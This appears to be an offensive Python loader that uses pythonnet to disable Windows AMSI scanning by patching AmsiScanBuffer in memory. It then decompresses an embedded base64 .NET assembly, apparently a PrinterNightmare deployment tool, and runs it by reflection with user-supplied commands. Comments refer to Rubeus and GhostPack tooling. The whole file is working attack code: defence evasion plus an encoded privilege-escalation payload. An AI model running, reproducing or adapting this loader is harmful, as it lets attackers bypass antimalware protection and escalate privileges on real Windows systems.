import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("DeployPrinterNightmare.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()